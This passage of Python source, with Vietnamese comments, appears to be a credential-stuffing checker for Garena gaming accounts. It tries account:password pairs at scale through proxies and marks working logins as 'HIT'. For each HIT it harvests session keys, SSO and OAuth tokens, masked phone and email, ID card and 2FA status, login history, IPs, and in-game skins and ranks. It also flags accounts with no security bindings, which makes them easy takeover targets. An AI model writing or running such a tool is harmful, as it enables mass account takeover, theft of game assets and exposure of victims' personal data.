                               "status": "INVALID", "detail": f"CAPTCHA+HTTP sai mật khẩu ({err_code})"}
                    elif err_code == 'account_not_exist':
                        out = {"account": account, "password": password,
                               "status": "NOT_FOUND", "detail": "CAPTCHA+HTTP không tìm thấy account"}
                    else:
                        out = {"account": account, "password": password,
                               "status": "CAPTCHA", "detail": f"TCP_CAPTCHA HTTP_ERR={http_r.get('error','')}"}
                    if debug:
                        dbg["http_fallback_err"] = http_r
                        out["debug"] = dbg
                    return out

                # Các loi khac (sai pass, ban, khong tim thay, ...)
                status_map = {
                    1: ("INVALID",    f"WRONG_PASSWORD result={result_code}"),
                    2: ("NOT_FOUND",  f"ACCOUNT_NOT_EXIST result={result_code}"),
                    3: ("CAPTCHA",    f"PREPARE_CAPTCHA result={result_code}"),
                    4: ("BANNED",     f"USER_BANNED result={result_code}"),
                    5: ("SEC_BANNED", f"SECURITY_BANNED result={result_code}"),
                }
                status, detail = status_map.get(result_code, ("MISS", f"PREPARE_FAIL result={result_code}"))
                out = {"account": account, "password": password, "status": status, "detail": detail}
                if debug:
                    out["debug"] = dbg
                return out

            # result_code == 0: CAPTCHA da giai thanh cong hoac khong bi CAPTCHA → tiep tuc Step 2

        prep_reply = _proto_decode(body)
        reply_key  = prep_reply.get(1, b'')
        reply_data = prep_reply.get(2, b'')
        if debug:
            dbg.update({
                "prepare_has_key": bool(reply_key),
                "prepare_has_data": bool(reply_data),
                "prepare_key_len": len(reply_key) if isinstance(reply_key, (bytes, bytearray)) else 0,
                "prepare_data_len": len(reply_data) if isinstance(reply_data, (bytes, bytearray)) else 0,
            })
        if not reply_key or not reply_data:
            out = {"account": account, "password": password,
                   "status": "ERROR", "detail": "Empty LoginPrepareReply"}
            if debug:
                out["debug"] = dbg
            return out

        prep_data   = _proto_decode(xtea_decrypt(reply_data, reply_key))
        salt        = prep_data.get(1, b'')
        verify_code = prep_data.get(2, b'')
        salt        = salt.decode('utf-8')        if isinstance(salt,        bytes) else salt
        verify_code = verify_code.decode('utf-8') if isinstance(verify_code, bytes) else verify_code
        if debug:
            dbg.update({
                "salt_len": len(salt) if isinstance(salt, str) else 0,
                "verify_len": len(verify_code) if isinstance(verify_code, str) else 0,
            })

        # Step 2: CMD_LOGIN (257)
        login_body, xtea_key = _build_login(account, password, salt, verify_code)
        sock.sendall(_build_frame(CMD_LOGIN, login_body))

        hdr, body = _recv_cmd_frame(sock, CMD_LOGIN, max_tries=5)
        result_code = hdr.get(5, 0)
        if debug:
            dbg.update({
                "login_result": result_code,
                "login_body_len": len(body) if body else 0,
            })
        if result_code != 0:
            out = {"account": account, "password": password,
                   "status": "INVALID", "detail": f"LOGIN_FAIL result={result_code}"}
            if debug:
                out["debug"] = dbg
            return out

        login_reply = _proto_decode(body)
        enc_reply   = login_reply.get(1, b'')
        if debug:
            dbg.update({
                "login_has_enc": bool(enc_reply),
                "login_enc_len": len(enc_reply) if isinstance(enc_reply, (bytes, bytearray)) else 0,
            })
        if not enc_reply:
            out = {"account": account, "password": password,
                   "status": "ERROR", "detail": "Empty LoginReply data"}
            if debug:
                out["debug"] = dbg
            return out

        reply_decoded = _proto_decode(xtea_decrypt(enc_reply, xtea_key))
        uid           = reply_decoded.get(1, 0)
        session_key   = reply_decoded.get(2, b'')
        if debug:
            dbg.update({
                "uid": uid,
                "session_key_len": len(session_key) if isinstance(session_key, (bytes, bytearray)) else 0,
            })

        if not uid:
            out = {"account": account, "password": password,
                   "status": "ERROR", "detail": "UID=0 in reply"}
            if debug:
                out["debug"] = dbg
            return out

        result = {
            "account": account, "password": password, "status": "HIT",
            "uid": uid,
            "session_key": session_key.hex() if isinstance(session_key, bytes) else "",
        }
        if debug:
            result["debug"] = dbg

        # ── Post-login: fetch extra info ──
        if fetch_info and isinstance(session_key, bytes) and len(session_key) == 16:
            import datetime as _dt

            # ── Phase 1: TCP commands (sequential, same socket) ──
            # HTTP tasks are submitted to the shared pool as soon as their tokens are
            # ready, so they execute in parallel while the TCP sequence continues.
            login_info = _fetch_login_info(sock, session_key)
            result.update({
                "region":     login_info.get('region', ''),
                "shells":     login_info.get('shells', 0),
                "topup_time": login_info.get('topup_time', 0),
            })
            ll = login_info.get('last_login', 0)
            if ll:
                result['last_login'] = _dt.datetime.fromtimestamp(ll).strftime('%Y-%m-%d %H:%M:%S')
            ct = login_info.get('created_time', 0)
            if ct:
                result['garena_created'] = _dt.datetime.fromtimestamp(ct).strftime('%H:%M:%S %d-%m-%Y')
            if login_info.get('fb_uid_login'):
                result['fb_uid'] = login_info['fb_uid_login']
            if login_info.get('fb_link_time'):
                result['fb_link_time'] = _dt.datetime.fromtimestamp(login_info['fb_link_time']).strftime('%d-%m-%Y')
            if login_info.get('last_session_ip'):
                result['last_session_ip'] = login_info['last_session_ip']
            if login_info.get('last_session_country'):
                result['last_session_country'] = login_info['last_session_country']
            if login_info.get('last_session_time'):
                result['last_session_time'] = _dt.datetime.fromtimestamp(login_info['last_session_time']).strftime('%d-%m-%Y %H:%M')

            basic = _fetch_user_basic(sock, uid, session_key)
            result.update({
                "username": basic.get('username', ''),
                "nickname": basic.get('nickname', ''),
            })

            acct = _fetch_account_info(sock, session_key)
            result.update({
                "password_set":    acct.get('password_set', False),
                "email_verified":  acct.get('email_verified', False),
                "mobile_bound":    acct.get('mobile_bound', False),
                "account_secured": acct.get('account_secured', False),
            })

            fb = _fetch_fb_info(sock, session_key)
            result['fb_linked'] = fb.get('fb_linked', False)

            sso = _fetch_sso_key(sock, session_key)
            sso_key = sso.get('sso_key', '')
            result['sso_key'] = sso_key

            _pool = _ensure_http_pool()
            _futs = {}
            if sso_key:
                _futs['acct_sec'] = _pool.submit(_fetch_account_security, sso_key, proxy)
                _futs['uac']      = _pool.submit(_fetch_uac_country, sso_key, proxy)

            tok = _fetch_session_token(sock, session_key)
            session_token = tok.get('session_token', '')
            result['session_token'] = session_token
            http_key = session_token or sso_key
            if http_key:
                _futs['rg'] = _pool.submit(_fetch_recent_games, http_key, proxy)

            # AoV OAuth token (for weekly/aov_info HTTP APIs)
            oauth = _fetch_oauth_token(sock, session_key, LIEN_QUAN_APP_ID)
            aov_token = oauth.get('access_token', '')
            if aov_token:
                result['aov_access_token'] = aov_token
            # AoV redirect URL (code flow) for sale.lienquan.garena.vn
            sale_redirect = _get_app_redirect_url(sock, session_key,
                                                   "https://sale.lienquan.garena.vn/login/callback")
            region = result.get("region", "VN") or "VN"
            kt = {}
            if aov_token:
                _futs['weekly']   = _pool.submit(_fetch_weekly_profile, aov_token, proxy)
                _futs['aov_info'] = _pool.submit(_fetch_aov_user_info, aov_token, region, proxy)
                # _fetch_kientuong_player uses sock for TCP then does HTTP internally
                kt = _fetch_kientuong_player(sock, session_key, proxy=proxy)
            if sale_redirect:
                _futs['skins'] = _pool.submit(_fetch_sale_skins, sale_redirect, proxy)

            # ── RoV Thailand: termgame roles + skin via TCP token ──
            if sso_key:
                _futs['rov_th'] = _pool.submit(_fetch_rov_th_via_termgame, sso_key, proxy)
            # Fetch ROV TH access_token via TCP for skin check
            rov_oauth = _fetch_oauth_token(sock, session_key, ROV_TH_APP_ID)
            rov_token = rov_oauth.get('access_token', '')
            if rov_token:
                _futs['rov_skins'] = _pool.submit(_fetch_sale_skins, rov_token, proxy)

            fc_oauth = _fetch_oauth_token(sock, session_key, FC_MOBILE_VN_APP_ID)
            fc_token = fc_oauth.get("access_token", "")
            if fc_token:
                _futs['fc_info'] = _pool.submit(_fetch_fc_mobile_vn_user_info, fc_token, region, proxy)
                _futs['fc_me']   = _pool.submit(_fetch_fcmobile_me_from_access_token, fc_token, proxy)
                if sso_key:
                    _futs['fc_sso_pm'] = _pool.submit(_fetch_fc_prefill_via_sso, sso_key, proxy)

            # ── Delta Force via playerinfinite.com ──
            if sso_key:
                _futs['df'] = _pool.submit(_fetch_delta_force_info, sso_key, proxy)

            # ── Phase 2: Collect all HTTP results (already running in background) ──
            _hr = {}
            for _k, _f in _futs.items():
                try:
                    _t = 10 if _k == 'acct_sec' else (25 if _k == 'df' else 6)
                    _hr[_k] = _f.result(timeout=_t)
                except Exception:
                    _hr[_k] = {}

            # Account security info from account.garena.com
            acct_sec = _hr.get('acct_sec') or {}
            result['_acct_sec_ok'] = bool(acct_sec)
            if acct_sec:
                result['masked_phone'] = acct_sec.get('masked_phone', '')
                result['masked_email'] = acct_sec.get('masked_email', '')
                result['email_v'] = acct_sec.get('email_v', 0)
                result['idcard'] = acct_sec.get('idcard', '')
                result['authenticator_enable'] = acct_sec.get('authenticator_enable', 0)
                result['two_step_verify'] = acct_sec.get('two_step_verify', 0)
                if acct_sec.get('country_code'):
                    result['country_code'] = str(acct_sec.get('country_code', '')).strip()
                if acct_sec.get('acc_country'):
                    result['acc_country'] = str(acct_sec.get('acc_country', '')).strip()
                if acct_sec.get('country'):
                    result['country'] = acct_sec.get('country', '')
                if acct_sec.get('fb_connected'):
                    result['fb_linked'] = True
                if acct_sec.get('fb_account'):
                    result['fb_account_name'] = acct_sec['fb_account']
                result['suspicious'] = int(acct_sec.get('suspicious', 0) or 0)
                if acct_sec.get('login_history'):
                    result['login_history'] = acct_sec['login_history']
                if acct_sec.get('sensitive_ops'):
                    result['sensitive_ops'] = acct_sec['sensitive_ops']
                if acct_sec.get('init_ip'):
                    result['init_ip'] = acct_sec['init_ip']

            rg = _hr.get('rg')
            if rg:
                result['recent_games'] = rg

            cc = (result.get('country_code') or "").strip()
            if not cc:
                mp = (result.get("masked_phone") or "").strip()
                mcc = re.match(r"^\+(\d{1,4})\b", mp)
                if mcc:
                    cc = mcc.group(1)
                    result["country_code"] = cc

            # UAC (shop.sg) — chỉ bổ sung acc_country khi API chưa có; không ép đè MCC/SĐT
            uac_country = _hr.get('uac') or ""
            if uac_country and not (result.get("acc_country") or "").strip():
                result["acc_country"] = uac_country

            country_from_init = ""
            try:
                _ci = result.get("country")
                if isinstance(_ci, str) and _ci.strip():
                    country_from_init = _ci.strip()
            except Exception:
                pass

            acc_raw = (result.get("acc_country") or "").strip()
            # Ưu tiên: MCC (country_code / SĐT) → acc_country → tên country (account init) → UAC → region
            _country_candidates = [cc, acc_raw, country_from_init, uac_country,
                                   (result.get('region', '') or '').strip().upper()]
            _resolved = "UNKNOWN"
            for _raw in _country_candidates:
                if not _raw:
                    continue
                _n = _normalize_country(_raw)
                if _n and _n != "UNKNOWN":
                    _resolved = _n
                    break
            result["country"] = _resolved

            # ── Liên Quân (AOV) skin check ──
            if aov_token:
                skins = _hr.get('skins')
                if skins:
                    result['aov_skins'] = skins
                    if skins.get('item_history'):
                        result['aov_item_history'] = skins['item_history']

                weekly = _hr.get('weekly') or {}
                if weekly:
                    result['aov_name'] = weekly.get('name', '')
                    rank_base  = weekly.get('rank', '')
                    rank_stars = int(weekly.get('rank_stars') or 0)
                    result['aov_rank_id']    = weekly.get('rank_id')
                    result['aov_rank_stars'] = rank_stars
                    result['aov_rank_entry'] = weekly.get('rank_entry', {})
                    if rank_stars and rank_base:
                        r_low = rank_base.lower()
                        if 'cao th' in r_low or 'master' in r_low:
                            result['aov_rank'] = f"{rank_base} {rank_stars}"
                        else:
                            result['aov_rank'] = rank_base
                    else:
                        result['aov_rank'] = rank_base

                if kt:
                    result['aov_level']    = kt.get('level', 0)
                    result['aov_reg_time'] = kt.get('register_time', '')
                    result['aov_banned']   = 'YES' if _is_yes(kt.get('banned', 'NO')) else 'NO'
                    kt_stars = int(kt.get('rank_stars') or 0)
                    kt_rank  = kt.get('rank')
                    if kt_stars > 0:
                        result['aov_rank_stars'] = kt_stars
                        r_base = result.get('aov_rank') or kt_rank or 'Cao Thủ'
                        r_base = re.sub(r'\s*\d+$', '', r_base)
                        r_low  = r_base.lower()
                        if 'cao th' in r_low or 'master' in r_low:
                            result['aov_rank'] = f"{r_base} {kt_stars}"
                        else:
                            result['aov_rank'] = r_base
                    elif not result.get('aov_rank') and kt_rank:
                        rank_base = kt_rank
                        r_low = rank_base.lower()
                        result['aov_rank_stars'] = kt_stars
                        if kt_stars and ('cao th' in r_low or 'master' in r_low):
                            result['aov_rank'] = f"{rank_base} {kt_stars}"
                        else:
                            result['aov_rank'] = rank_base
                        result['aov_rank_source'] = 'kientuong'
                    result['_kt_player'] = kt.get('_raw_player', {})

                aov_info = _hr.get('aov_info') or {}
                result["aov_user_info"] = aov_info
                try:
                    if isinstance(aov_info, dict):
                        result["aov_prefill_mobile"] = ((aov_info.get("data") or {}).get("prefill_mobile") or "").strip()
                except Exception:
                    pass

            # ── RoV TH skin check (same sale engine, TCP ROV token) ──
            if rov_token:
                rov_skins = _hr.get('rov_skins') or {}
                if rov_skins and (rov_skins.get('total_skins') or rov_skins.get('cp')):
                    result['rov_skins'] = rov_skins

            # ── RoV Thailand merge from termgame.com flow ──
            rov_th = _hr.get('rov_th') or {}
            if rov_th:
                result['rov_th'] = rov_th
                if rov_th.get('uac') and not result.get('country_code'):
                    result['country_code'] = rov_th.get('uac')
                # Real in-game name = rov_role_name when it differs from termgame username.
                # (role_id may be 0 for accounts that have played but never topped up.)
                rov_name = (rov_th.get('rov_role_name') or '').strip()
                tg_user  = (rov_th.get('tg_username')   or '').strip()
                has_real_name = rov_name and rov_name != tg_user
                if (rov_th.get('has_rov_role') or has_real_name) and not (result.get('aov_name') or '').strip():
                    result['aov_name'] = rov_name
                # AoV VN server from termgame
                if rov_th.get('aov_server'):
                    result['aov_server'] = rov_th['aov_server']
                    result['aov_server_id'] = rov_th.get('aov_server_id', 0)
                if rov_th.get('aov_tg_name') and not (result.get('aov_name') or '').strip():
                    result['aov_name'] = rov_th['aov_tg_name']
                # Propagate RoV TH fields to top-level result for display
                if rov_th.get('rov_role_name'):
                    result['rov_name']        = rov_th['rov_role_name']
                    result['rov_server']      = rov_th.get('rov_server', '')
                    result['rov_server_id']   = rov_th.get('rov_server_id', 0)
                    result['rov_role_id']     = rov_th.get('rov_role_id', 0)
                    result['rov_open_id']     = rov_th.get('rov_open_id', '')
                    result['has_rov_role']    = rov_th.get('has_rov_role', False)
                # Always carry shells (TH equivalent of QH); only override if VN gave nothing.
                cur_qh = ((result.get('aov_skins') or {}).get('cp', 0) or 0)
                if rov_th.get('shells') and not cur_qh:
                    result.setdefault('aov_skins', {})['cp'] = rov_th.get('shells')
                # display_mobile_no from termgame as fallback phone
                tg_mob = (rov_th.get('tg_display_mobile') or '').strip()
                if tg_mob and not (result.get('masked_phone') or '').strip():
                    result['masked_phone'] = tg_mob
                if rov_th.get('tg_is_verified'):
                    result['garena_verified'] = True

            if fc_token:
                result["fc_mobile_vn_access_token"] = fc_token
                fc_info = _hr.get('fc_info') or {}
                result["fc_mobile_vn_user_info"] = fc_info
                try:
                    if isinstance(fc_info, dict):
                        result["fcmobile_prefill_mobile"] = ((fc_info.get("data") or {}).get("prefill_mobile") or "").strip()
                except Exception:
                    pass

                sso_pm = (_hr.get('fc_sso_pm') or '').strip()
                if sso_pm:
                    result["fcmobile_prefill_mobile"] = sso_pm
                    if "*" not in sso_pm:
                        result["aov_prefill_mobile"] = sso_pm
                fm = _hr.get('fc_me') or {}
                if fm:
                    result["fcmobile_web_host"] = fm.get("host")
                    result["ss_fcm"]            = fm.get("ss_fcm")
                    result["fcmobile_user"]     = fm.get("user") or {}
                    result["fcmobile_ovr"]      = fm.get("ovr")
                    result["fcmobile_uid"]      = fm.get("uid")
                    result["fcmobile_name"]     = fm.get("name")
                    result["fcmobile_rankTCN"]  = fm.get("rankTCN")
                    result["fcmobile_rankDDC"]  = fm.get("rankDDC")
                    result["fcmobile_rankDGL"]  = fm.get("rankDGL")
                    result["fcmobile_point"]    = fm.get("point")

            # ── Delta Force merge ──
            df = _hr.get('df') or {}
            if df:
                result['delta_force'] = df
                if df.get('df_has_data'):
                    result['df_nickname'] = df.get('df_nickname', '')
                    result['df_level'] = df.get('df_level', 0)
                    result['df_rank'] = df.get('df_rank', '')
                    result['df_matches'] = df.get('df_matches', 0)
                    result['df_wins'] = df.get('df_wins', 0)
                    result['df_kd'] = df.get('df_kd', '')
                    result['df_uid_game'] = df.get('df_uid_game', '')

        if result.get("aov_rank"):
            # Lọc số sao cũ dính liền nếu có để dịch cho chuẩn
            base_r = re.sub(r'\s*\d+$', '', result["aov_rank"]).strip()
            trans_r = _translate_aov_rank(base_r)
            # Thêm lại số sao nếu có
            stars = result.get("aov_rank_stars", 0)
            if stars > 0 and trans_r in ("Cao Thủ", "Chiến Tướng"):
                result["aov_rank"] = f"{trans_r} {stars}"
            else:
                result["aov_rank"] = trans_r

        return result

    except socket.timeout:
        timed_out_ip = _HOST_IP
        with _HOST_IP_lock:
            _HOST_IP = None
        out = {
            "account": account,
            "password": password,
            "status": "TIMEOUT",
            "detail": f"Socket timeout to {HOST}:{PORT} (ip={timed_out_ip or 'unknown'})",
        }
        if debug:
            out["debug"] = dbg
        return out
    except Exception as exc:
        out = {"account": account, "password": password, "status": "ERROR", "detail": str(exc)}
        if debug:
            out["debug"] = dbg
        return out
    finally:
        if sock:
            try: sock.close()
            except: pass
        _conn_sem.release()  # tra lai slot cho thread khac

# ── Pretty printer ────────────────────────────────────────────────────────────
def _print_hit_box(r: dict):
    """Print a highlighted HIT box in the CMD with all key info."""
    sk = r.get('aov_skins') or {}
    sep = _c(C.CYAN, '─' * 62)
    top = _c(C.BG_GREEN + C.BOLD + C.WHITE, '  ✔  HIT FOUND  ✔  '.center(62))
    print(f"\n{top}")
    print(sep)

    def row(label: str, value: str, color: str = C.WHITE):
        lbl = _c(C.YELLOW, f"  ► {label:<18}")
        val = _c(color, value)
        print(f"{lbl}{val}")

    acc = r.get('account', '')
    pw  = r.get('password', '')
    row("Account",  f"{acc}:{pw}", C.CYAN + C.BOLD)
    row("UID",      str(r.get('uid', '')))
    if r.get('nickname'):
        row("Nickname",  r['nickname'], C.MAGENTA)
    if r.get('aov_name'):
        row("LQ Name",   r['aov_name'], C.MAGENTA)

    ctry = (r.get('country') or '').strip()
    reg  = (r.get('region')  or '').strip()
    if ctry:
        row("Country",  ctry, C.GREEN)
    if reg:
        row("Region",   reg)

    # Get best available phone
    _full_phone = (r.get('aov_prefill_mobile') or '').strip() or \
                  (r.get('fcmobile_prefill_mobile') or '').strip()
    _show_phone = _full_phone or (r.get('masked_phone') or '').strip()
    
    if _show_phone:
        mob_str = _c(C.GREEN, f"YES [{_show_phone}]")
    else:
        mob_str = _c(C.GREEN, 'YES') if r.get('mobile_bound') else _c(C.RED, 'NO')
        
    masked_email = (r.get('masked_email') or '').strip()
    if masked_email:
        mail_str = _c(C.GREEN, f"YES [{masked_email}]")
    else:
        mail_str = _c(C.GREEN, 'YES') if r.get('email_verified') or r.get('email_v') else _c(C.RED, 'NO')

    _fb_uid = (r.get('fb_uid') or r.get('fb_uid_login') or '').strip()
    fb_str   = _c(C.GREEN, f'YES [{_fb_uid}]') if r.get('fb_linked') and _fb_uid else \
               _c(C.GREEN, 'YES') if r.get('fb_linked') else _c(C.RED, 'NO')
    cccd_str = _c(C.GREEN, 'YES') if (r.get('idcard') or '').replace('*','') else _c(C.RED, 'NO')
    auth_str = _c(C.GREEN, 'YES') if (r.get('authenticator_enable') or r.get('two_step_verify')) else _c(C.RED, 'NO')
    ban_raw  = r.get('aov_banned', 'NO')
    ban_str  = _c(C.RED, 'BAN') if _is_yes(ban_raw) else _c(C.GREEN, 'OK')
    print(f"  {_c(C.YELLOW, '► Security          ')}SĐT:{mob_str}  Mail:{mail_str}  FB:{fb_str}  CCCD:{cccd_str}  2FA:{auth_str}  BAN:{ban_str}")

    shells = r.get('shells', 0)
    if shells:
        row("Sò",       str(shells), C.YELLOW)
    _sess_ip  = (r.get('last_session_ip') or '').strip()
    _sess_cc  = (r.get('last_session_country') or '').strip()
    _sess_dt  = (r.get('last_session_time') or '').strip()
    if _sess_ip:
        _sess_str = f"{_sess_ip} [{_sess_cc}]"
        if _sess_dt: _sess_str += f"  {_sess_dt}"
        row("IP Garena", _sess_str, C.GRAY)

    aov_rank = r.get('aov_rank', '')
    aov_lv   = r.get('aov_level', 0)
    aov_reg  = r.get('aov_reg_time', '')
    aov_server = r.get('aov_server', '')
    if aov_server:
        row("Server", aov_server, C.CYAN)
    if aov_rank:
        stars = int(r.get('aov_rank_stars') or 0) or _extract_master_stars(aov_rank)
        row("Rank", _rank_display(aov_rank, stars), C.MAGENTA)
    if aov_lv:
        row("Level",    str(aov_lv))
    if aov_reg:
        row("Ngày đăng ký", aov_reg)
    # Ban details
    ban_raw = r.get('aov_banned', 'NO')
    if _is_yes(ban_raw):
        kt_player = r.get('_kt_player') or {}
        ban_info  = kt_player.get('banInfo') or {}
        unban_ts  = ban_info.get('unbanTime', 0)
        if unban_ts:
            try:
                import datetime as _dt2
                unban_str = _dt2.datetime.fromtimestamp(int(unban_ts)).strftime('%d/%m/%Y %H:%M')
                row("BAN đến", unban_str, C.RED)
            except Exception:
                pass
        ban_reason = (ban_info.get('reason') or '').strip()
        if ban_reason:
            row("Lý do BAN", ban_reason, C.RED)
    # Sale item history
    item_history = r.get('aov_item_history') or []
    if item_history:
        recent = item_history[:5]
        hist_parts = []
        for it in recent:
            ts = (it.get('createdAt') or '')[:10]
            extra = (it.get('extra') or it.get('source') or '?')[:20]
            cost = it.get('costStr') or ''
            hist_parts.append(f"{ts} {extra}({cost})" if cost else f"{ts} {extra}")
        row("Lịch sử mua", ' | '.join(hist_parts), C.GRAY)

    total_sk   = sk.get('total_skins', 0)
    total_chmp = sk.get('total_champs', 0)
    cp         = sk.get('cp', 0)
    row("Skin/Champ", f"{total_sk} skins / {total_chmp} champs  QH={cp}",
        C.GREEN if total_sk else C.GRAY)

    for tier, label in (('sss','SSS'), ('ss','SS'), ('anime','Anime')):
        cnt = sk.get(tier, 0)
        if cnt:
            names = ', '.join(sk.get(f'{tier}_list', [])[:5])
            row(f"{label}({cnt})",  names, C.CYAN)

    # ── RoV Thailand ──
    rov_name   = (r.get('rov_name') or '').strip()
    rov_server = (r.get('rov_server') or '').strip()
    rov_sk     = r.get('rov_skins') or {}
    if rov_name or rov_server or rov_sk:
        print(sep)
        if rov_name:
            row("RoV Name",   rov_name, C.MAGENTA)
        if rov_server:
            row("RoV Server", rov_server, C.CYAN)
        rov_role_id = r.get('rov_role_id', 0)
        if rov_role_id:
            row("RoV Role ID", str(rov_role_id))
        if rov_sk:
            rov_total = rov_sk.get('total_skins', 0)
            rov_cp    = rov_sk.get('cp', 0)
            row("RoV Skin/CP", f"{rov_total} skins  QH={rov_cp}",
                C.GREEN if rov_total else C.GRAY)
            for tier, lbl in (('sss','SSS'),('ss','SS'),('anime','Anime')):
                cnt = rov_sk.get(tier, 0)
                if cnt:
                    names = ', '.join(rov_sk.get(f'{tier}_list', [])[:4])
                    row(f"RoV {lbl}({cnt})", names, C.CYAN)

    # ── Delta Force ──
    df_name  = (r.get('df_nickname') or '').strip()
    df_rank  = (r.get('df_rank') or '').strip()
    df_level = r.get('df_level', 0)
    df_m     = r.get('df_matches', 0)
    df_w     = r.get('df_wins', 0)
    df_kd    = r.get('df_kd', '')
    if df_name or df_rank or df_level:
        print(sep)
        row("DF Name",   df_name or '?', C.MAGENTA)
        if df_rank:
            row("DF Rank",   df_rank, C.CYAN)
        if df_level:
            row("DF Level",  str(df_level))
        if df_m:
            wr = f"{df_w*100//df_m}%" if df_m else "0%"
            kd_s = f"  K/D={df_kd}" if df_kd else ""
            row("DF Matches", f"{df_m} ({df_w}W / {wr}){kd_s}", C.GREEN)
    elif r.get('delta_force'):
        df_info = r.get('delta_force') or {}
        df_err = df_info.get('df_intl_error') or df_info.get('df_cms_error') or df_info.get('df_api_error') or ''
        if df_err:
            row("Delta Force", f"[{df_err}]", C.GRAY)

    # ── Security signals ──
    suspicious = int(r.get('suspicious', 0) or 0)
    if suspicious:
        row("!! Suspicious", str(suspicious), C.RED)
    garena_created = r.get('garena_created', '')
    if garena_created:
        row("Tạo GR",   garena_created)
    ll = r.get('last_login', '')
    if ll:
        row("Đăng nhập", _fmt_last_login(ll), C.YELLOW)

    tinh_trang = _derive_tinh_trang(r)
    tt_color   = C.GREEN if tinh_trang == 'Acc Trắng' else (C.RED if 'Full' in tinh_trang or 'fetch fail' in tinh_trang else C.YELLOW)
    row("Tình Trạng", tinh_trang, tt_color)

    print(sep + "\n")


def _print_result(r: dict, verbose: bool = False, stats: dict = None):
    status = r["status"]
    acc    = r['account']
    pw     = r['password']

    # Build live stats suffix
    stat_str = ""
    if stats is not None:
        done  = stats.get('done', 0)
        total = stats.get('total', 0)
        hits  = stats.get('hits', 0)
        inv   = stats.get('invalid', 0)
        err   = stats.get('error', 0)
        pct   = f"{done*100//total}%" if total else "0%"
        stat_str = _c(C.GRAY, f" [{done}/{total} {pct}  ") + \
                   _c(C.GREEN, f"HIT:{hits}") + _c(C.GRAY, " ") + \
                   _c(C.RED, f"DIE:{inv}") + _c(C.GRAY, " ") + \
                   _c(C.YELLOW, f"ERR:{err}") + _c(C.GRAY, "]")

    if status == "HIT":
        _print_hit_box(r)
        if verbose and r.get('session_key'):
            print(_c(C.GRAY, f"  SessKey: {r['session_key']}"))
    elif status == "INVALID":
        print(_c(C.RED, f"\n ✘ [DIE]") + _c(C.GRAY, f" {acc}:{pw}") + stat_str)
    elif status == "TIMEOUT":
        print(_c(C.YELLOW, f"\n ⏱ [TIMEOUT]") + _c(C.GRAY, f" {acc}") + stat_str)
    elif status == "MISS":
        # Lọc bỏ MISS result=101/105/174 (tài khoản không phải Garena) — không in
        detail = r.get('detail', '')
        skip_codes = ('result=101', 'result=105', 'result=174')
        if any(c in detail for c in skip_codes):
            return  # im lặng, không in
        print(_c(C.GRAY, f"\n ! [MISS]") + _c(C.GRAY, f" {acc} {detail}") + stat_str)
    else:
        detail = r.get('detail', '')
        print(_c(C.YELLOW, f"\n ! [{status}]") + _c(C.GRAY, f" {acc} {detail}") + stat_str)

def _print_bulk_status(stats: dict, started_at: float):
    """Single-line bulk progress to avoid log spam."""
    done  = stats.get('done', 0)
    total = stats.get('total', 0)
    hits  = stats.get('hits', 0)
    inv   = stats.get('invalid', 0)
    err   = stats.get('error', 0)
    white_hits = stats.get('white_hits', 0)
    white_shells = stats.get('white_shells', 0)
    pct   = f"{done*100//total}%" if total else "0%"
    elapsed = max(1.0, time.time() - started_at)
    cpm = int(done / elapsed * 60)
    line = (
        f"[{done}/{total}] {pct} | CPM:{cpm} | HIT:{hits} | DIE:{inv} | ERR:{err} | "
        f"WHITE:{white_hits} | SO_WHITE:{white_shells}"
    )
    sys.stdout.write(f"\r\033[K{line}")
    sys.stdout.flush()

# ── Helpers ────────────────────────────────────────────────────────────────────
def _fmt_last_login(ts_str: str) -> str:
    """Format last login as relative date like 'Hôm Nay (HH:MM:SS dd/mm/yyyy)'."""
    if not ts_str:
        return 'N/A'
    import datetime as _dt
    try:
        dt = _dt.datetime.strptime(ts_str, '%Y-%m-%d %H:%M:%S')
        if dt.year < 2010:
            return 'Chưa từng đăng nhập'
            
        now = _dt.datetime.now()
        delta = (now.date() - dt.date()).days
        time_part = dt.strftime('%H:%M:%S %d/%m/%Y')
        if delta == 0:
            return f'Hôm Nay ({time_part})'
        elif delta == 1:
            return f'Hôm Qua ({time_part})'
        elif delta <= 7:
            return f'{delta} ngày trước ({time_part})'
        elif delta <= 30:
            return f'{delta // 7} tuần trước ({time_part})'
        elif delta <= 365:
            return f'{delta // 30} tháng trước ({time_part})'
        else:
            return f'{delta // 365} năm trước ({time_part})'
    except Exception:
        return ts_str

def _skin_fmt(count: int, names: list) -> str:
    """Format skin tier: 'No Skin' or 'N [name1, name2]'."""
    if count == 0:
        return 'No Skin'
    return f"{count} [{', '.join(names)}]"

def _derive_tinh_trang(h: dict) -> str:
    """Derive account status description from bindings."""
    pw = h.get('password_set', False)
    
    # Email verified
    email_v = h.get('email_v', 0) or 0
    email_verified = h.get('email_verified', False)
    masked_email = h.get('masked_email', '')
    has_email = email_verified or email_v > 0
    # Nếu có masked_email và không phải toàn dấu *
    if masked_email and masked_email.replace('*', '').replace('@', '').replace('.', ''):
        has_email = True
    
    # SĐT
    mobile_bound = h.get('mobile_bound', False)
    masked_phone = h.get('masked_phone', '')
    prefill_phone = (h.get('aov_prefill_mobile') or '').strip() or \
                    (h.get('fcmobile_prefill_mobile') or '').strip()
    has_phone = mobile_bound or bool(masked_phone) or bool(prefill_phone)
    
    fb = h.get('fb_linked', False)
    cccd = bool(h.get('idcard', '').replace('*', ''))
    auth = h.get('authenticator_enable', 0) or h.get('two_step_verify', 0)
    
    parts = []
    if has_phone:   parts.append('SĐT')
    if has_email:   parts.append('Mail')
    if fb:          parts.append('FB')
    if cccd:        parts.append('CCCD')
    if auth:        parts.append('2FA')
    if pw:          parts.append('Pass')
    
    # BAN status (aov_banned = 'YES'/'NO' from kientuong)
    is_banned = _is_yes(h.get('aov_banned', ''))

    suspicious = int(h.get('suspicious', 0) or 0)

    total = len(parts)
    if total == 0:
        base = 'Acc Trắng'
    elif total >= 4:
        base = 'Full Info'
    else:
        base = 'Acc Dính ' + ' + '.join(parts)

    suffix = []
    if is_banned:
        suffix.append('BAN')
    if suspicious:
        suffix.append('Suspicious')
    if suffix:
        return base + ' [' + ' + '.join(suffix) + ']'
    return base

def _normalize_country(code: str) -> str:
    if not code:
        return "UNKNOWN"
    code = str(code).strip().upper()
    mapping = {
        "AF": "AFGHANISTAN",
        "AX": "ÅLAND ISLANDS",
        "AL": "ALBANIA",
        "DZ": "ALGERIA",
        "AS": "AMERICAN SAMOA",
        "AD": "ANDORRA",
        "AO": "ANGOLA",
        "AI": "ANGUILLA",
        "AQ": "ANTARCTICA",
        "AG": "ANTIGUA AND BARBUDA",
        "AR": "ARGENTINA",
        "AM": "ARMENIA",
        "AW": "ARUBA",
